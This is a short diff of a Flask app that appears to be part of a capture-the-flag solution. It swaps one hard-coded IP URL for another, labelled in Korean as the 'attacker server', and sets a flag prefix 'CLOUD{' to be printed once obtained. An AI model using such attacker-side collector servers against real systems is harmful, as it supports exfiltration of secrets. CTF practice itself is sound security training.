@@ -5,7 +5,7 @@ app = Flask(__name__)
 app.secret_key = os.urandom(32)
 
 flag = 'CLOUD{'
-url = 'http://54.180.31.209:8000/'
+url = 'http://3.35.210.51:8000/' # 공격자 서버
 
 # 구한 flag 출력
 @app.route('/')
